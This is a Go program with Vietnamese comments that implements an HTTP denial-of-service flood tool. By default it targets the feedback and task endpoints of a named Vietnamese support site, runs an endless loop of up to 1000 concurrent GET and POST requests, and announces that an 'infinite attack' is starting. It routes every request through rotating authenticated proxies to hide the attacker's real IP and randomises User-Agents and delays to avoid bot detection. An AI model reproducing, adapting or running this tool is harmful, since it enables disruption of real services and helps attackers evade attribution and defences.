package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Cấu trúc để lưu thống kê
type Stats struct {
	totalRequests   int64
	successCount    int64
	errorCount      int64
	totalDuration   int64
	proxyUsedCount  int64
	directUsedCount int64
}

// Cấu trúc để lưu thông tin proxy
type Proxy struct {
	IP       string
	Port     string
	Username string
	Password string
}

// Cấu trúc để lưu cấu hình
type Config struct {
	TargetServer   string
	TargetPort     string
	Protocol       string
	Endpoints      []string
	MaxConcurrent  int
	DelayMs        int
}

// Đọc cấu hình từ file config.txt
func loadConfig(filename string) (*Config, error) {
	config := &Config{
		TargetServer:  "support.trianh.vn",  // Mặc định
		TargetPort:    "443",
		Protocol:      "https",
		Endpoints:     []string{"/feedback/index", "/task/index"},
		MaxConcurrent: 1000,
		DelayMs:       10,
	}
	
	file, err := os.Open(filename)
	if err != nil {
		// Nếu không có file config, dùng giá trị mặc định
		return config, nil
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])
		
		switch key {
		case "TARGET_SERVER":
			config.TargetServer = value
		case "TARGET_PORT":
			config.TargetPort = value
		case "PROTOCOL":
			config.Protocol = value
		case "ENDPOINTS":
			config.Endpoints = append(config.Endpoints, value)
		case "MAX_CONCURRENT":
			if val, err := strconv.Atoi(value); err == nil {
				config.MaxConcurrent = val
			}
		case "DELAY_MS":
			if val, err := strconv.Atoi(value); err == nil {
				config.DelayMs = val
			}
		}
	}
	
	return config, scanner.Err()
}

// Đọc danh sách proxy từ file
func loadProxies(filename string) ([]Proxy, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []Proxy
	scanner := bufio.NewScanner(file)
	
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		
		// Format: IP:PORT:USERNAME:PASSWORD
		parts := strings.Split(line, ":")
		if len(parts) >= 4 {
			proxy := Proxy{
				IP:       parts[0],
				Port:     parts[1],
				Username: parts[2],
				Password: parts[3],
			}
			proxies = append(proxies, proxy)
		}
	}
	
	return proxies, scanner.Err()
}

// Tạo HTTP client với proxy
func createProxyClient(proxy Proxy) (*http.Client, error) {
	proxyURL, err := url.Parse(fmt.Sprintf("http://%s:%s@%s:%s", 
		proxy.Username, proxy.Password, proxy.IP, proxy.Port))
	if err != nil {
		return nil, err
	}

	transport := &http.Transport{
		Proxy:                 http.ProxyURL(proxyURL),
		MaxIdleConns:          5000,   // Giảm connection pool để tiết kiệm port
		MaxIdleConnsPerHost:   500,    // Giảm connections per host
		IdleConnTimeout:       5 * time.Second, // Giảm thời gian giữ kết nối để giải phóng port nhanh hơn
		DisableKeepAlives:     false,  // Giữ keep-alive để tái sử dụng kết nối
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true}, // Bỏ qua xác minh chứng chỉ
		DisableCompression:    true,   // Tắt compression để tăng tốc
		MaxConnsPerHost:       500,    // Giảm max connections để tránh port exhaustion
		ResponseHeaderTimeout: 8 * time.Second,  // Giảm timeout
		ExpectContinueTimeout: 2 * time.Second,  // Giảm expect timeout
		// BẮT BUỘC SỬ DỤNG PROXY - KHÔNG CHO PHÉP DIRECT CONNECTION
		ProxyConnectHeader: map[string][]string{
			"User-Agent": {"Go-http-client/1.1"},
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second, // Giảm timeout để giải phóng kết nối nhanh hơn
	}

	return client, nil
}

func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxies []Proxy) {
	defer wg.Done()
	
	start := time.Now()
	atomic.AddInt64(&stats.totalRequests, 1)
	
	// BẮT BUỘC SỬ DỤNG PROXY - KHÔNG BAO GIỜ DÙNG IP THẬT
	if len(proxies) == 0 {
		fmt.Printf("Client %d: KHÔNG CÓ PROXY - DỪNG NGAY LẬP TỨC\n", clientID)
		atomic.AddInt64(&stats.errorCount, 1)
		return
	}
	
	// Retry với 3 proxy khác nhau nếu timeout - BẮT BUỘC PHẢI SỬ DỤNG PROXY
	maxRetries := 3
	for retry := 0; retry < maxRetries; retry++ {
		// CHỌN PROXY NGẪU NHIÊN - KHÔNG BAO GIỜ DÙNG DIRECT CONNECTION
		proxy := proxies[rand.Intn(len(proxies))]
		fmt.Printf("Client %d đang sử dụng proxy: %s:%s\n", clientID, proxy.IP, proxy.Port)
		
		client, err := createProxyClient(proxy)
		if err != nil {
			fmt.Printf("Client %d lỗi tạo proxy %s:%s: %v\n", clientID, proxy.IP, proxy.Port, err)
			if retry == maxRetries-1 {
				fmt.Printf("Client %d: TẤT CẢ PROXY ĐỀU THẤT BẠI - DỪNG\n", clientID)
				atomic.AddInt64(&stats.errorCount, 1)
				return
			}
			continue
		}
		atomic.AddInt64(&stats.proxyUsedCount, 1)

		// Mô phỏng yêu cầu GET
		getResp, err := client.Get(endpoint)
		if err != nil {
			if retry == maxRetries-1 {
				fmt.Printf("Lỗi khi gửi GET từ client %d: %v\n", clientID, err)
				atomic.AddInt64(&stats.errorCount, 1)
				return
			}
			continue // Thử proxy khác
		}
		defer getResp.Body.Close()
		fmt.Printf("Client %d (GET) nhận phản hồi: %s\n", clientID, getResp.Status)

		// Kiểm tra status code
		if getResp.StatusCode < 200 || getResp.StatusCode >= 300 {
			fmt.Printf("Client %d (GET) nhận status code không thành công: %d\n", clientID, getResp.StatusCode)
		}

		// Mô phỏng yêu cầu POST (giả lập gửi form feedback)
		postData := bytes.NewBuffer([]byte(`{"name":"TestUser","message":"Test DDoS simulation"}`))
		postReq, err := http.NewRequest("POST", endpoint, postData)
		if err != nil {
			if retry == maxRetries-1 {
				fmt.Printf("Lỗi khi tạo POST từ client %d: %v\n", clientID, err)
				atomic.AddInt64(&stats.errorCount, 1)
				return
			}
			continue
		}
		postReq.Header.Set("Content-Type", "application/json")
		// Mô phỏng hành vi người dùng thật: Thay đổi User-Agent ngẫu nhiên
		userAgents := []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		}
		postReq.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

		postResp, err := client.Do(postReq)
		if err != nil {
			if retry == maxRetries-1 {
				fmt.Printf("Lỗi khi gửi POST từ client %d: %v\n", clientID, err)
				atomic.AddInt64(&stats.errorCount, 1)
				return
			}
			continue // Thử proxy khác
		}
		defer postResp.Body.Close()
		fmt.Printf("Client %d (POST) nhận phản hồi: %s\n", clientID, postResp.Status)

		// Kiểm tra status code
		if postResp.StatusCode < 200 || postResp.StatusCode >= 300 {
			fmt.Printf("Client %d (POST) nhận status code không thành công: %d\n", clientID, postResp.StatusCode)
		}

		// Cập nhật thống kê - thành công
		duration := time.Since(start)
		atomic.AddInt64(&stats.successCount, 1)
		atomic.AddInt64(&stats.totalDuration, int64(duration))

		// Độ trễ ngẫu nhiên để tránh bị phát hiện là bot
		delay := time.Duration(rand.Intn(500)+100) * time.Millisecond // Độ trễ 100-600ms
		time.Sleep(delay)
		
		return // Thành công, thoát khỏi retry loop
	}
	
	// Nếu hết retry mà vẫn lỗi
	atomic.AddInt64(&stats.errorCount, 1)
}

func main() {
	// =============================================
	// TỰ ĐỘNG ĐỌC CẤU HÌNH TỪ FILE CONFIG.TXT
	// =============================================
	
	fmt.Println("📖 Đang đọc cấu hình từ file config.txt...")
	config, err := loadConfig("config.txt")
	if err != nil {
		fmt.Printf("⚠️  Lỗi đọc config: %v, sử dụng cấu hình mặc định\n", err)
	}
	
	// Sử dụng cấu hình từ file
	TARGET_SERVER := config.TargetServer
	TARGET_PORT := config.TargetPort
	PROTOCOL := config.Protocol
	TARGET_ENDPOINTS := config.Endpoints
	maxConcurrent := config.MaxConcurrent
	
	// =============================================
	// TỰ ĐỘNG TẠO FULL URLs TỪ CẤU HÌNH
	// =============================================
	
	var endpoints []string
	
	// Tạo full URLs từ cấu hình
	for _, endpoint := range TARGET_ENDPOINTS {
		if TARGET_PORT == "443" && PROTOCOL == "https" {
			// HTTPS port 443 không cần ghi port
			endpoints = append(endpoints, fmt.Sprintf("%s://%s%s", PROTOCOL, TARGET_SERVER, endpoint))
		} else if TARGET_PORT == "80" && PROTOCOL == "http" {
			// HTTP port 80 không cần ghi port  
			endpoints = append(endpoints, fmt.Sprintf("%s://%s%s", PROTOCOL, TARGET_SERVER, endpoint))
		} else {
			// Các port khác cần ghi rõ
			endpoints = append(endpoints, fmt.Sprintf("%s://%s:%s%s", PROTOCOL, TARGET_SERVER, TARGET_PORT, endpoint))
		}
	}

	// Khởi tạo thống kê
	stats := &Stats{}

	// Đọc danh sách proxy
	proxies, err := loadProxies("proxies.txt")
	if err != nil {
		fmt.Printf("❌ LỖI KHI ĐỌC FILE PROXY: %v\n", err)
		fmt.Println("🚫 KHÔNG THỂ TIẾP TỤC MÀ KHÔNG CÓ PROXY!")
		fmt.Println("🔒 CHƯƠNG TRÌNH CHỈ SỬ DỤNG PROXY - KHÔNG BAO GIỜ DÙNG IP THẬT!")
		return
	} 
	
	if len(proxies) == 0 {
		fmt.Println("🚫 KHÔNG CÓ PROXY NÀO ĐƯỢC TẢI! DỪNG CHƯƠNG TRÌNH.")
		fmt.Println("🔒 BẮT BUỘC PHẢI CÓ PROXY ĐỂ TRÁNH LỘ IP THẬT!")
		return
	}
	
	fmt.Printf("✅ Đã tải %d proxy từ file\n", len(proxies))
	fmt.Println("🔒 CHẾ ĐỘ: CHỈ SỬ DỤNG PROXY - KHÔNG BAO GIỜ DÙNG IP THẬT")
	fmt.Printf("🎯 TARGET: %s:%s (%s)\n", TARGET_SERVER, TARGET_PORT, PROTOCOL)
	fmt.Printf("📍 ENDPOINTS: %v\n", TARGET_ENDPOINTS)
	fmt.Println("🚀 BẮT ĐẦU TẤN CÔNG LIÊN TỤC VÔ HẠN!")
	fmt.Println("⚠️  Nhấn Ctrl+C để dừng chương trình")

	start := time.Now()
	semaphore := make(chan struct{}, maxConcurrent) // Channel để giới hạn goroutines
	
	// In thống kê mỗi 30 giây
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				totalTime := time.Since(start)
				fmt.Printf("\n=== THỐNG KÊ HIỆN TẠI (sau %v) ===\n", totalTime)
				fmt.Printf("Tổng số requests: %d\n", atomic.LoadInt64(&stats.totalRequests))
				fmt.Printf("Thành công: %d\n", atomic.LoadInt64(&stats.successCount))
				fmt.Printf("Lỗi: %d\n", atomic.LoadInt64(&stats.errorCount))
				fmt.Printf("Sử dụng proxy: %d\n", atomic.LoadInt64(&stats.proxyUsedCount))
				fmt.Printf("Kết nối trực tiếp: %d\n", atomic.LoadInt64(&stats.directUsedCount))
				
				if stats.successCount > 0 {
					avgDuration := time.Duration(atomic.LoadInt64(&stats.totalDuration) / atomic.LoadInt64(&stats.successCount))
					fmt.Printf("Thời gian phản hồi trung bình: %v\n", avgDuration)
				}
				fmt.Println("=======================================")
			}
		}
	}()

	// Vòng lặp vô hạn - gửi requests liên tục
	clientID := 1
	for {
		// Đợi cho đến khi có slot trống
		semaphore <- struct{}{}
		
		// Chọn endpoint ngẫu nhiên để tấn công
		endpoint := endpoints[rand.Intn(len(endpoints))]
		
		// Chạy goroutine để gửi yêu cầu HTTP
		go func(id int, targetEndpoint string) {
			defer func() { <-semaphore }() // Giải phóng slot
			
			// Không cần WaitGroup vì chạy vô hạn
			var dummyWG sync.WaitGroup
			dummyWG.Add(1)
			sendHTTPRequest(targetEndpoint, id, stats, &dummyWG, proxies)
		}(clientID, endpoint)
		
		clientID++
		
		// Delay nhỏ để tránh quá tải
		if clientID%50 == 0 {
			time.Sleep(10 * time.Millisecond)
		}
	}
}